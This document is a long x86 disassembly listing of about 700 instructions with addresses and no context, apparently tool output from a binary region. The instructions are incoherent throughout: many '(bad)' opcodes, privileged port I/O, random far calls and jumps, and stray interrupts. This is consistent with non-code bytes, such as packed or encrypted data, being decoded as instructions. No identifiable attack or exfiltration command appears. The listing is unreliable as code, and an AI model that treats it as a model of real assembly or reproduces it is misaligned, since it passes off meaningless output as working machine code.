  418eb3:	mov    dh,0xdb
  418eb5:	mov    cl,0xc9
  418eb7:	cmp    ch,BYTE PTR ss:[edx]
  418eba:	loopne 0x418ee7
  418ebc:	ja     0x418eb5
  418ebe:	fdivr  DWORD PTR [ebx-0x6deb3475]
  418ec4:	pop    ebx
  418ec5:	pusha  
  418ec6:	sub    bh,BYTE PTR [esi-0x47]
  418ec9:	mov    WORD PTR [edi-0x2d72682b],ds
  418ecf:	cwde   
  418ed0:	cld    
  418ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ed2:	xchg   esp,eax
  418ed3:	or     al,0xe6
  418ed5:	add    edx,DWORD PTR [ebx-0x19]
  418ed8:	push   esp
  418ed9:	xor    DWORD PTR [edx],esi
  418edb:	push   esi
  418edc:	mov    al,0xe9
  418ede:	or     eax,0x19c9e970
  418ee3:	mov    esp,0x35fdfd16
  418ee8:	xchg   edi,eax
  418ee9:	call   0x618:0x2e8a059e
  418ef0:	or     ch,BYTE PTR [edi+0x4f602b73]
  418ef6:	mov    ch,0xf5
  418ef8:	addr16 xor al,0xa
  418efb:	xlat   BYTE PTR ds:[ebx]
  418efc:	jne    0x418f56
  418efe:	dec    ebp
  418eff:	out    0x7b,eax
  418f01:	sub    bh,BYTE PTR [edi]
  418f03:	pop    ds
  418f04:	xchg   esp,eax
  418f05:	(bad)  
  418f06:	xor    ebx,esp
  418f08:	cld    
  418f09:	mov    dl,0x6f
  418f0b:	inc    esi
  418f0c:	ds (bad) 
  418f0e:	into   
  418f0f:	ffreep st(7)
  418f11:	fadd   st,st(2)
  418f13:	repz fs jno 0x418eb4
  418f17:	outs   dx,BYTE PTR ds:[esi]
  418f18:	cdq    
  418f19:	and    edx,DWORD PTR [ecx+0x6a]
  418f1c:	xchg   edi,eax
  418f1d:	pusha  
  418f1e:	in     eax,dx
  418f1f:	mov    ah,BYTE PTR [ebx+0xc57bc8a]
  418f25:	xlat   BYTE PTR ds:[ebx]
  418f26:	rol    eax,1
  418f28:	imul   esi,DWORD PTR [ecx+0x7d185e84],0xb424b5ea
  418f32:	mov    bl,0x6e
  418f34:	xchg   edx,eax
  418f35:	fisubr WORD PTR [esp+eax*2+0x6f]
  418f39:	in     al,dx
  418f3a:	push   cs
  418f3b:	popa   
  418f3c:	add    DWORD PTR [ecx-0x5f2ab23f],0xffffffdc
  418f43:	push   0xf48ebc7
  418f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f49:	xor    BYTE PTR [esi+0x54f152fd],bh
  418f4f:	mov    edx,0xee8f5ccc
  418f54:	mov    ecx,0xb78e375b
  418f59:	or     eax,0xfd0c80f3
  418f5e:	lea    esi,[eax+0x7fefbd67]
  418f64:	(bad)  [eax]
  418f66:	int    0x4e
  418f68:	lds    ebx,FWORD PTR [ebx]
  418f6a:	imul   esi,DWORD PTR [edi+ebp*1+0x261b893c],0x2432ae81
  418f75:	or     eax,0x2198883f
  418f7a:	ret    
  418f7b:	mul    dh
  418f7d:	add    BYTE PTR [esi+eax*8],cl
  418f80:	xchg   esp,eax
  418f81:	sub    DWORD PTR [ecx-0x35],edi
  418f84:	sti    
  418f85:	xor    DWORD PTR [ebp-0x5d],0xb0ea75c7
  418f8c:	sub    BYTE PTR [ebp+0x71e5134c],cl
  418f92:	xchg   edx,eax
  418f93:	dec    ebx
  418f94:	push   eax
  418f95:	ds adc al,0x9
  418f98:	test   DWORD PTR [eax*4+0x5cd337cb],ebp
  418f9f:	or     al,BYTE PTR [ebp-0x66]
  418fa2:	daa    
  418fa3:	jno    0x418f41
  418fa5:	in     al,dx
  418fa6:	push   ebx
  418fa7:	imul   edi,DWORD PTR [esi+eax*8],0xffffffcb
  418fab:	pop    esp
  418fac:	or     al,0x88
  418fae:	and    bl,BYTE PTR [edx+0x41]
  418fb1:	mov    ebp,0x30e13a8a
  418fb6:	mov    DWORD PTR [edi-0x5d],esp
  418fb9:	loope  0x41902d
  418fbb:	xchg   edx,eax
  418fbc:	repz jnp 0x418fea
  418fbf:	xor    DWORD PTR [ebp-0x17bfe771],ebp
  418fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc6:	popf   
  418fc7:	rcr    DWORD PTR [edi+0x5d],1
  418fca:	pop    edi
  418fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fcc:	xor    DWORD PTR [edx+ebx*8],esp
  418fcf:	or     ebx,DWORD PTR [ebp+0x46]
  418fd2:	add    dl,bh
  418fd4:	out    0x29,al
  418fd6:	nop
  418fd7:	or     esi,edx
  418fd9:	push   ds
  418fda:	inc    ebp
  418fdb:	or     DWORD PTR [ecx+0x32],edx
  418fde:	ds (bad) 
  418fe0:	or     dh,BYTE PTR [esi]
  418fe2:	mov    DWORD PTR ds:0xee772968,0xad5d5a53
  418fec:	mov    ebp,0x7295f64a
  418ff1:	ret    
  418ff2:	test   eax,0xd25fa382
  418ff7:	or     al,BYTE PTR [edi+ecx*8]
  418ffa:	push   ds
  418ffb:	dec    ebx
  418ffc:	call   0xfd4:0x1fdba515
  419003:	cmp    edi,edi
  419005:	int3   
  419006:	pop    ss
  419007:	int3   
  419008:	mov    edi,ss
  41900a:	jae    0x418fcf
  41900c:	ret    
  41900d:	pop    ds
  41900e:	dec    ecx
  41900f:	xchg   dl,dl
  419011:	mov    cl,0xb6
  419013:	mov    fs,ebp
  419015:	push   edi
  419016:	jle    0x418fee
  419018:	jecxz  0x419020
  41901a:	mov    dh,0xf0
  41901c:	xchg   esi,eax
  41901d:	cmp    al,0xb9
  41901f:	sbb    dl,BYTE PTR [ebx+edx*1-0x58b610df]
  419026:	fimul  DWORD PTR [esi+0x9d8246d]
  41902c:	jnp    0x418fd1
  41902e:	pop    esi
  41902f:	xor    DWORD PTR [ebx+esi*1+0x61],eax
  419033:	jl     0x419019
  419035:	ja     0x419023
  419037:	out    dx,al
  419038:	adc    DWORD PTR [eax],0x6ef12606
  41903e:	loop   0x41901c
  419040:	cdq    
  419041:	jmp    0x4190c2
  419043:	dec    ebp
  419044:	xor    DWORD PTR [eax-0x66],edi
  419047:	repnz xor eax,0x1a785f47
  41904d:	mov    bl,0x12
  41904f:	js     0x418fd6
  419051:	pop    ebx
  419052:	xor    esi,ebp
  419054:	call   0xccde499b
  419059:	inc    ebx
  41905a:	mov    ebp,0x5ce3238e
  41905f:	mov    bh,0xd8
  419061:	in     eax,dx
  419062:	fsubr  QWORD PTR [esi-0x79]
  419065:	setne  BYTE PTR [ecx+edi*4+0x18]
  41906a:	jne    0x419083
  41906c:	mov    DWORD PTR [edx],edi
  41906e:	jbe    0x419013
  419070:	out    0x7c,eax
  419072:	jle    0x41906e
  419074:	dec    ebp
  419075:	imul   ebx,DWORD PTR [ebp-0x6e],0x6b
  419079:	pop    esi
  41907a:	pop    esi
  41907b:	jb     0x41900f
  41907d:	adc    ecx,ecx
  41907f:	ret    
  419080:	jle    0x419006
  419082:	lods   al,BYTE PTR ds:[esi]
  419083:	sbb    BYTE PTR [eax-0x4d],bl
  419086:	gs inc edi
  419088:	or     DWORD PTR [ebx+0x3692bfef],0x5da0cd7b
  419092:	fild   QWORD PTR [edx-0x52]
  419095:	mov    ?,esi
  419097:	jne    0x419069
  419099:	inc    eax
  41909a:	lock fld QWORD PTR [ecx-0x2d259c0d]
  4190a1:	or     DWORD PTR [edx-0x31],0x42
  4190a5:	scas   al,BYTE PTR es:[edi]
  4190a6:	add    dl,BYTE PTR [ecx+ebp*8]
  4190a9:	pop    ecx
  4190aa:	push   ebp
  4190ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ac:	lods   al,BYTE PTR ds:[esi]
  4190ad:	add    BYTE PTR [ecx-0xf184be7],0xc0
  4190b4:	cs mov esp,0xee56b550
  4190ba:	cwde   
  4190bb:	xor    al,0xe0
  4190bd:	xchg   DWORD PTR [eax+0x2e],ebx
  4190c0:	sti    
  4190c1:	mov    bh,0x3a
  4190c3:	and    cl,ch
  4190c5:	leave  
  4190c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190c7:	jo     0x4190db
  4190c9:	push   edx
  4190ca:	cmp    DWORD PTR [esi-0x5581b3d9],edi
  4190d0:	mov    WORD PTR [eax-0x7327bf38],gs
  4190d6:	xor    eax,0xa59011d6
  4190db:	jne    0x4190a3
  4190dd:	lahf   
  4190de:	bound  edx,QWORD PTR [ebp-0x5816bcd9]
  4190e4:	jp     0x419124
  4190e6:	mov    ds,WORD PTR [edx]
  4190e8:	xchg   BYTE PTR [edi-0xa394252],ah
  4190ee:	ins    BYTE PTR es:[edi],dx
  4190ef:	xchg   esi,eax
  4190f0:	push   ebp
  4190f1:	sub    dl,BYTE PTR [esi+0x49]
  4190f4:	adc    BYTE PTR [edi-0x90dcba6],dh
  4190fa:	int    0x44
  4190fc:	stos   BYTE PTR es:[edi],al
  4190fd:	jl     0x4190b2
  4190ff:	loope  0x419154
  419101:	outs   dx,BYTE PTR ds:[esi]
  419102:	xchg   DWORD PTR [ecx+edx*1],ebp
  419105:	ret    0x51d5
  419108:	push   es
  419109:	add    DWORD PTR [ecx-0x40fe3b64],ebp
  41910f:	jmp    0xd86de003
  419114:	inc    ebx
  419115:	fisub  WORD PTR [ecx+0x69]
  419118:	add    BYTE PTR [edx],dh
  41911a:	fadd   st,st(2)
  41911c:	fdiv   QWORD PTR [ecx+0x2f80231d]
  419122:	jne    0x41914f
  419124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419125:	lahf   
  419126:	(bad)  
  419127:	push   ebx
  419128:	rol    DWORD PTR [ebp-0x726ad190],1
  41912e:	inc    edx
  41912f:	pop    ecx
  419130:	imul   DWORD PTR [ebx-0x4a9220f0]
  419136:	fistp  DWORD PTR [esi+0x2cb32155]
  41913c:	pop    esi
  41913d:	xlat   BYTE PTR ds:[ebx]
  41913e:	jl     0x41916e
  419140:	loopne 0x419165
  419142:	or     eax,0xaa71667c
  419147:	xchg   ecx,eax
  419148:	(bad)  
  41914a:	cdq    
  41914b:	adc    eax,0xb767caf1
  419150:	inc    esi
  419151:	mov    ebp,0x9e370cb2
  419156:	shl    BYTE PTR [esp+ebx*4-0x76],0xc3
  41915b:	imul   ebx,DWORD PTR [ebp+ebp*8+0x12],0xffffffdd
  419160:	jne    0x41912d
  419162:	jg     0x419124
  419164:	repnz sub al,dh
  419167:	pop    ebp
  419168:	icebp  
  419169:	sbb    al,0x61
  41916b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41916c:	push   ds
  41916d:	add    ebx,DWORD PTR [ebx+0xc2601c0]
  419173:	jnp    0x4190fb
  419175:	(bad)  
  419176:	sar    bh,1
  419178:	inc    eax
  419179:	push   edx
  41917a:	push   ecx
  41917b:	ror    DWORD PTR fs:[esi],1
  41917e:	inc    esp
  41917f:	push   0x6b
  419181:	mov    al,0xa
  419183:	sbb    eax,0xb1191d0b
  419188:	fiadd  WORD PTR [ecx+eiz*1+0x7a]
  41918c:	repnz pushf 
  41918e:	shr    DWORD PTR [ebp-0x5f],1
  419191:	mov    esi,DWORD PTR [esi+0x15]
  419194:	push   edi
  419195:	in     eax,dx
  419196:	test   BYTE PTR [ecx-0x3],bl
  419199:	mov    ch,0x64
  41919b:	sahf   
  41919c:	jle    0x41913d
  41919e:	shr    BYTE PTR [ecx-0x28],cl
  4191a1:	adc    DWORD PTR [eax+eiz*8-0x42],edx
  4191a5:	outs   dx,BYTE PTR ds:[esi]
  4191a6:	ret    0x64b2
  4191a9:	dec    eax
  4191aa:	mov    ds:0xab6ad731,al
  4191af:	in     eax,dx
  4191b0:	pop    edi
  4191b1:	cmp    ebx,0xf1b4ffb7
  4191b7:	xchg   ebp,eax
  4191b8:	xchg   ecx,eax
  4191b9:	test   al,0xef
  4191bb:	shl    BYTE PTR [ebp+eiz*1+0x27],0xcc
  4191c0:	xor    DWORD PTR [edi+0x7654ec33],ebx
  4191c6:	lods   eax,DWORD PTR ds:[esi]
  4191c7:	scas   eax,DWORD PTR es:[edi]
  4191c8:	mov    ebp,0x1442e057
  4191cd:	inc    ebp
  4191ce:	aam    0x2b
  4191d0:	and    al,0xf7
  4191d2:	ret    0x7f85
  4191d5:	in     al,dx
  4191d6:	or     eax,0xc4a8c0d9
  4191db:	(bad)  
  4191dc:	mov    WORD PTR [eax],es
  4191de:	cdq    
  4191df:	sbb    DWORD PTR [ecx+0x47],ebx
  4191e2:	push   ecx
  4191e3:	adc    al,0x1d
  4191e5:	mov    ?,WORD PTR [esi+0x5c63c742]
  4191eb:	xchg   edi,eax
  4191ec:	inc    BYTE PTR cs:[esi-0x25]
  4191f0:	mov    ah,0xa9
  4191f2:	xchg   edi,eax
  4191f3:	jnp    0x419187
  4191f5:	jle    0x41923d
  4191f7:	or     eax,0xc922f796
  4191fc:	push   cs
  4191fd:	dec    edi
  4191fe:	jmp    0xedb0:0xd6da7a09
  419205:	xlat   BYTE PTR ds:[ebx]
  419206:	daa    
  419207:	adc    eax,0x2256c0ac
  41920c:	cmp    BYTE PTR [ecx-0x2a76e7fe],ch
  419212:	jnp    0x419215
  419214:	(bad)  
  419216:	es sahf 
  419218:	sar    BYTE PTR [edi],cl
  41921a:	jmp    0x5bea:0xe4ad1fd3
  419221:	sbb    DWORD PTR [eax-0x52acbf1f],edi
  419227:	les    edx,FWORD PTR [eax]
  419229:	mov    ds:0xad69e87a,eax
  41922e:	xchg   esp,eax
  41922f:	add    BYTE PTR [esi+0x57],cl
  419232:	mov    edi,0xb884519f
  419237:	xchg   BYTE PTR [eax+0x53],dl
  41923a:	mov    cl,0x5f
  41923c:	es retf 
  41923e:	dec    esp
  41923f:	mov    al,0xfa
  419241:	add    DWORD PTR [ecx-0x40fc31f0],ebp
  419247:	push   ebx
  419248:	cwde   
  419249:	add    ecx,DWORD PTR [esi-0x607e6165]
  41924f:	sub    eax,0x5b4afec2
  419254:	loop   0x41923e
  419256:	dec    edi
  419257:	(bad)  
  419258:	lea    eax,[ecx-0x61]
  41925b:	mov    ecx,0x529e0991
  419260:	sub    ah,BYTE PTR [ebp-0xb]
  419263:	int3   
  419264:	ret    0xe6c4
  419267:	int    0x9c
  419269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926a:	ins    DWORD PTR es:[edi],dx
  41926b:	ins    DWORD PTR es:[edi],dx
  41926c:	test   DWORD PTR [bp+0x5c],eax
  419270:	call   0x3f09b58f
  419275:	fistp  WORD PTR [ebx+0x75da3b7]
  41927b:	clc    
  41927c:	nop
  41927d:	cld    
  41927e:	lock pop edx
  419280:	into   
  419281:	std    
  419282:	(bad)  
  419283:	ss ret 
  419285:	mov    bh,0xe8
  419287:	push   esi
  419288:	and    DWORD PTR [ecx+0x4e],edx
  41928b:	xchg   ebp,eax
  41928c:	ficomp DWORD PTR [edx-0x7c0ffcd0]
  419292:	push   ebp
  419293:	mov    ch,0x66
  419295:	xchg   ebp,eax
  419296:	xor    al,0x51
  419298:	and    DWORD PTR [eax-0x24],ebx
  41929b:	je     0x419247
  41929d:	(bad)  
  41929e:	and    ah,BYTE PTR [edx]
  4192a0:	sbb    eax,0x2811d67
  4192a5:	mov    al,0x52
  4192a7:	push   edx
  4192a8:	mov    al,ds:0x4874c0c6
  4192ad:	ins    BYTE PTR es:[edi],dx
  4192ae:	fs xchg ebx,eax
  4192b0:	(bad)  
  4192b1:	push   0xffffffde
  4192b3:	push   ss
  4192b4:	dec    edx
  4192b5:	rol    BYTE PTR [eax+0x67fa0ab8],0x36
  4192bc:	and    al,0x7e
  4192be:	push   cs
  4192bf:	jae    0x4192d5
  4192c1:	stc    
  4192c2:	jl     0x41932e
  4192c4:	sbb    eax,0x695d213b
  4192c9:	add    ebp,eax
  4192cb:	repz cmp al,0xa1
  4192ce:	and    DWORD PTR [eax+0x41489660],0x56
  4192d5:	mov    esp,0xd3b309ac
  4192da:	xchg   ebp,eax
  4192db:	cmp    ecx,ebx
  4192dd:	mov    esp,0x4a9050fb
  4192e2:	in     al,0xa6
  4192e4:	adc    edx,eax
  4192e6:	addr16 loop 0x419272
  4192e9:	mov    ebp,0x8ec7cfbb
  4192ee:	sbb    eax,0x80a4c0ef
  4192f3:	sub    eax,0xda7aef47
  4192f8:	lds    esp,FWORD PTR ds:0x1229bd7c
  4192fe:	adc    ecx,esp
  419300:	call   0x5c7eb92c
  419305:	inc    ecx
  419306:	je     0x419348
  419308:	pop    es
  419309:	(bad)  
  41930c:	jmp    0xdddf:0xffaa7fdd
  419313:	push   ecx
  419314:	xor    al,0x9
  419316:	aad    0xe9
  419318:	ja     0x41934a
  41931a:	out    0x9a,al
  41931c:	inc    esp
  41931d:	xchg   esp,eax
  41931e:	inc    edx
  41931f:	inc    esp
  419320:	leave  
  419321:	sbb    ecx,DWORD PTR [esi]
  419323:	int3   
  419324:	jns    0x4192f7
  419326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419327:	or     eax,0x4fc217b3
  41932c:	sar    DWORD PTR [esi-0x5bea017c],1
  419332:	mov    edi,0x4d28a16
  419337:	js     0x41937a
  419339:	(bad)  
  41933a:	fucom  st(5)
  41933c:	mov    eax,0x76082737
  419341:	out    dx,al
  419342:	cmp    eax,0x613806f
  419347:	pushf  
  419348:	inc    esp
  419349:	cmp    bh,dl
  41934b:	iret   
  41934c:	ja     0x419315
  41934e:	fcmovnb st,st(0)
  419350:	jo     0x41937f
  419352:	push   cs
  419353:	jmp    0xae046ffe
  419358:	cwde   
  419359:	(bad)  
  41935a:	xor    al,0xbf
  41935c:	data16 jle 0x41930a
  41935f:	mov    dh,0xfa
  419361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419362:	test   DWORD PTR [ebx+0x41],ebp
  419365:	je     0x419383
  419367:	test   cl,0x9b
  41936a:	add    bl,dh
  41936c:	lds    edi,FWORD PTR [ebp-0x78]
  41936f:	in     eax,0xbc
  419371:	ror    esp,0xc0
  419374:	mov    edi,0x63070edf
  419379:	dec    ebp
  41937a:	bnd jb 0x4193f6
  41937d:	lods   al,BYTE PTR ds:[esi]
  41937e:	xchg   ebp,eax
  41937f:	into   
  419380:	outs   dx,BYTE PTR ds:[esi]
  419381:	call   0xfdeb:0xbaf747fe
  419388:	jno    0x4193ed
  41938a:	adc    al,BYTE PTR [ecx]
  41938c:	aas    
  41938d:	sub    al,0x73
  41938f:	call   0x836:0x13fdf939
  419396:	push   es
  419397:	int    0x9c
  419399:	ficomp DWORD PTR [esi+ebp*4+0x571a80ef]
  4193a0:	fwait
  4193a1:	cwde   
  4193a2:	mov    bh,0x63
  4193a4:	repz push 0x69
  4193a7:	int3   
  4193a8:	mov    edx,0xc430135c
  4193ad:	gs mov edi,0x6710e1eb
  4193b3:	(bad)  
  4193b4:	adc    al,0x8a
  4193b6:	dec    ebx
  4193b7:	mov    al,0x86
  4193b9:	push   edx
  4193ba:	mov    edx,0x339c93
  4193bf:	ja     0x4193e4
  4193c1:	stos   DWORD PTR es:[edi],eax
  4193c2:	test   BYTE PTR [edi+0x18],0x4e
  4193c6:	imul   edx,DWORD PTR [ebx-0x77fdcff9],0xd5513d72
  4193d0:	scas   al,BYTE PTR es:[edi]
  4193d1:	xor    ecx,DWORD PTR [ecx]
  4193d3:	pushf  
  4193d4:	cli    
  4193d5:	orps   xmm0,XMMWORD PTR [eax+0x4f]
  4193d9:	fmul   DWORD PTR [edi+0x55f3d079]
  4193df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193e0:	imul   esi,DWORD PTR gs:[ebx],0x62bb3094
  4193e7:	mov    edx,0x3952664
  4193ec:	adc    DWORD PTR [edx-0x4fa674d3],0x75
  4193f3:	inc    edi
  4193f4:	loopne 0x41942c
  4193f6:	sti    
  4193f7:	pop    edx
  4193f8:	vxorps xmm7,xmm1,xmm2
  4193fc:	loopne 0x4193a4
  4193fe:	xchg   ebx,eax
  4193ff:	xor    DWORD PTR [edi-0x5c616ec8],esi
  419405:	repnz stos BYTE PTR es:[edi],al
  419407:	enter  0xfe2e,0x5f
  41940b:	mov    ebx,0x6631c51e
  419410:	jae    0x4193db
  419412:	or     al,0x36
  419414:	pop    es
  419415:	mov    ecx,0x9b6aa337
  41941a:	loopne 0x4193ce
  41941c:	fst    QWORD PTR [ecx-0x20]
  41941f:	adc    ecx,eax
  419421:	sbb    BYTE PTR [esp+eiz*8],ch
  419424:	lods   al,BYTE PTR ds:[esi]
  419425:	in     al,0x1b
  419427:	sti    
  419428:	clc    
  419429:	jp     0x419451
  41942b:	mov    ebx,0x37c8fc0b
  419430:	mov    DWORD PTR [ebp-0x80341db],ebx
  419436:	in     al,dx
  419437:	dec    ebp
  419438:	lahf   
  419439:	loopne 0x419498
  41943b:	jbe    0x419417
  41943d:	(bad)  
  41943f:	js     0x419472
  419441:	leave  
  419442:	aaa    
  419443:	clc    
  419444:	sti    
  419445:	or     ebx,ebx
  419447:	ja     0x419458
  419449:	(bad)  
  41944a:	imul   esp,edx,0xa66a0c5d
  419450:	or     BYTE PTR ds:0x94e0dfae,dh
  419456:	and    DWORD PTR [ebx-0x437ba5f2],esp
  41945c:	xor    eax,0x91c4886c
  419461:	pop    ebx
  419462:	fwait
  419463:	loop   0x4193ee
  419465:	pusha  
  419466:	js     0x4194bf
  419468:	push   0x14aced22
  41946d:	push   0xffffff9d
  41946f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419470:	and    DWORD PTR [esi-0x9f81c03],0x54264c9f
  41947a:	rol    BYTE PTR [ebp-0x6b],0x57
  41947e:	sahf   
  41947f:	push   0x71a06e98
  419484:	mov    edx,0xa6928e05
  419489:	xchg   ebp,eax
  41948a:	imul   ebx,DWORD PTR [edx],0x7f
  41948d:	std    
  41948e:	adc    eax,0xaf337e08
  419493:	xor    al,0x6
  419495:	mov    ebp,0xe9a3bf00
  41949a:	xchg   ebp,eax
  41949b:	sbb    al,0x3b
  41949d:	test   al,0xc7
  41949f:	rcr    DWORD PTR fs:[edi-0x69670d6],0xdc
  4194a7:	add    al,0xda
  4194a9:	adc    DWORD PTR [edi-0x66ae167c],ecx
  4194af:	ins    BYTE PTR es:[edi],dx
  4194b0:	xchg   DWORD PTR [edx+0x7f],edx
  4194b3:	jo     0x419474
  4194b5:	push   ss
  4194b6:	add    al,0xaf
  4194b8:	sub    ah,BYTE PTR ds:0x8aa19864
  4194be:	stos   DWORD PTR es:[edi],eax
  4194bf:	fstp   QWORD PTR [esi+0x645027e1]
  4194c5:	xchg   ecx,eax
  4194c6:	shl    edi,1
  4194c8:	lea    ebx,[eax]
  4194ca:	in     eax,0x19
  4194cc:	sbb    eax,0x49002376
  4194d1:	or     eax,0x2e1ac869
  4194d6:	dec    edx
  4194d7:	call   0xeee:0xaf19ec22
  4194de:	ret    0xfdcb
  4194e1:	pop    eax
  4194e2:	xor    BYTE PTR [edi+0x79065b69],0xd5
  4194e9:	retf   0xcbce
  4194ec:	jp     0x4194e5
  4194ee:	leave  
  4194ef:	aam    0xad
  4194f1:	popf   
  4194f2:	push   eax
  4194f3:	mov    DWORD PTR [edx],ecx
  4194f5:	int3   
  4194f6:	(bad)  
  4194f7:	not    DWORD PTR [edx]
  4194f9:	shl    dh,1
  4194fb:	jp     0x41954e
  4194fd:	popa   
  4194fe:	popa   
  4194ff:	inc    esi
  419500:	cmp    al,0xcd
  419502:	xor    ebx,DWORD PTR [esp+ebp*2+0x57742b91]
  419509:	add    ecx,DWORD PTR [esi]
  41950b:	inc    edx
  41950c:	dec    esp
  41950d:	loopne 0x4194cc
  41950f:	push   ecx
  419510:	inc    esi
  419511:	jae    0x4194f6
  419513:	cwde   
  419514:	add    bh,bl
  419516:	add    BYTE PTR ds:0x6c1be668,bl
  41951c:	ins    DWORD PTR es:[edi],dx
  41951d:	pop    ss
  41951e:	ja     0x419559
  419520:	jns    0x41956a
  419522:	jmp    0x9d47e365
  419527:	mov    ds:0xd2f18bd2,eax
  41952c:	mov    dl,0x49
  41952e:	fld    TBYTE PTR [eax]
  419530:	and    ebx,ecx
  419532:	cmp    eax,0x4b48fa54
  419537:	(bad)  [esi+0x7f]
  41953a:	test   DWORD PTR [ebx+0x40],ebp
  41953d:	imul   ebx,esp,0xdad99aac
  419543:	(bad)  
  419544:	clc    
  419545:	cmp    al,BYTE PTR [ebp+0x13]
  419548:	mov    ch,0xc6
  41954a:	shl    DWORD PTR [edi-0x4a],1
  41954d:	dec    ecx
  41954e:	adc    ah,BYTE PTR [ebx-0x2f1cc885]
  419554:	jl     0x41957e
  419556:	loope  0x419554
  419558:	mov    bh,BYTE PTR [ebp+0x3348b2f1]
  41955e:	rol    BYTE PTR [eax+ebx*2+0x19],0x4
  419563:	push   0xeb2a8aa4
  419568:	mov    dh,0x6
  41956a:	cmc    
  41956b:	mov    al,dl
  41956d:	or     BYTE PTR [edi],cl
  41956f:	sub    esp,ebp
  419571:	pop    ebx
  419573:	icebp  
  419574:	pop    es
  419575:	es (bad) 
  419577:	stc    
  419578:	les    ebx,FWORD PTR [ebx+0x7a3cbe83]
  41957e:	or     eax,0x95daca87
  419583:	jb     0x419583
  419585:	imul   esp,esi,0x59
  419588:	pop    ebp
  419589:	ins    BYTE PTR es:[edi],dx
  41958a:	and    dh,BYTE PTR [ecx-0x5f18c238]
  419590:	sub    al,0x25
  419592:	es push ebx
  419594:	inc    edx
  419595:	retf   
  419596:	xchg   ebp,eax
  419597:	inc    edx
  419598:	lds    ebp,FWORD PTR [edx-0x304b1428]
  41959e:	inc    edx
  41959f:	add    DWORD PTR [ecx],esi
  4195a1:	loop   0x419609
  4195a3:	dec    ecx
  4195a4:	jmp    0x4cb5bf0c
  4195a9:	repz mov edx,0x68fcb739
  4195af:	xchg   ch,cl
  4195b1:	xor    BYTE PTR [edx-0x2c13dc42],bl
  4195b7:	or     dh,BYTE PTR [ebp+0x63]
  4195ba:	and    ebp,DWORD PTR es:[esi]
  4195bd:	out    dx,al
  4195be:	xlat   BYTE PTR ds:[ebx]
  4195bf:	and    al,0x97
  4195c1:	mov    ch,0xee
  4195c3:	das    
  4195c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195c5:	sbb    eax,0xd19df105
  4195ca:	fimul  WORD PTR [ebx]
  4195cc:	sbb    eax,0xfa411a0e
  4195d1:	jb     0x4195c7
  4195d3:	adc    dl,BYTE PTR [eax+0x47a7e8e8]
  4195d9:	push   edi
  4195da:	adc    BYTE PTR [ebx],0xb
  4195dd:	ret    0x9181
  4195e0:	mov    ecx,0x413faa37
  4195e5:	jmp    0x419587
  4195e7:	int3   
  4195e8:	jno    0x4195a3
  4195ea:	cmp    ebx,DWORD PTR [esi-0x1d]
  4195ed:	mov    ch,BYTE PTR [ebx+0x10862636]
  4195f3:	leave  
  4195f4:	mov    bh,0xa0
  4195f6:	repnz nop
  4195f8:	fs test ebp,eax
  4195fb:	mov    ds:0xfb66ef95,eax
  419600:	or     DWORD PTR [eiz*4-0x1270800f],eax
  419607:	dec    esp
  419608:	popf   
  419609:	jmp    DWORD PTR [edi]
  41960b:	ret    
  41960c:	(bad)  
  41960d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41960e:	(bad)  
  41960f:	mov    ecx,0xe4476932
  419614:	pop    esi
  419615:	push   ecx
  419616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419617:	lock ss add al,0x71
  41961b:	mov    dl,0x25
  41961d:	jmp    0x419693
  41961f:	add    eax,0xf3d8a269
  419624:	sbb    eax,0x1d4f3941
  419629:	mov    dh,0xb1
  41962b:	jge    0x419629
  41962d:	inc    eax
  41962e:	push   es
  41962f:	inc    eax
  419630:	mov    ds:0xcd26467d,eax
  419635:	outs   dx,DWORD PTR ds:[esi]
  419636:	sbb    eax,0x6c12d8c8
  41963b:	ins    DWORD PTR es:[edi],dx
  41963c:	cmp    eax,0x73d7afcb
  419641:	add    ah,BYTE PTR [ebp+0x59]
  419644:	es rol esi,cl
  419647:	push   es
  419648:	fstp   DWORD PTR [bx]
  41964b:	mov    dl,0xc6
  41964d:	jnp    0x419623
  41964f:	aad    0xd9
  419651:	inc    ebp
  419652:	repz loope 0x419609
  419655:	je     0x419624
  419657:	dec    ebx
  419658:	retf   
  419659:	mov    ds:0x570cece0,al
  41965e:	sub    esp,esp
  419660:	pop    eax
  419661:	lods   eax,DWORD PTR ds:[esi]
  419662:	cld    
  419663:	(bad)  
  419665:	call   0xce9:0xe7852f86
  41966c:	jae    0x4195ee
  41966e:	scas   eax,DWORD PTR es:[edi]
  41966f:	jae    0x419616
  419671:	xor    eax,DWORD PTR [edi]
  419673:	jbe    0x4196d0
  419675:	adc    eax,0x89d0d847
  41967a:	sub    BYTE PTR [esi-0x19fe5dd1],bl
  419680:	adc    dh,ah
  419682:	fwait
  419683:	adc    eax,0xe34e1faf
  419688:	mov    al,0xeb
  41968a:	or     al,0x3d
  41968c:	ja     0x419640
  41968e:	xor    al,BYTE PTR [ebp-0x4e]
  419691:	pop    edi
  419692:	jg     0x4196a5
  419694:	loope  0x419708
  419696:	imul   esi,ecx,0x3d
  419699:	pop    ds
  41969a:	or     dh,BYTE PTR [eax+0x3a]
  41969d:	mov    es,WORD PTR [eax+0x2a]
  4196a0:	fld    st(5)
  4196a2:	dec    edi
  4196a3:	sub    bh,dl
  4196a5:	adc    ch,BYTE PTR [ecx]
  4196a7:	loope  0x4196ea
  4196a9:	add    esi,esp
  4196ab:	cld    
  4196ac:	xor    al,0xd
  4196ae:	mov    ds:0x1ad163d6,eax
  4196b3:	jb     0x41969f
  4196b5:	popf   
  4196b6:	sbb    ah,BYTE PTR [ebp-0x30]
  4196b9:	cmp    al,0xa7
  4196bb:	outs   dx,DWORD PTR ds:[si]
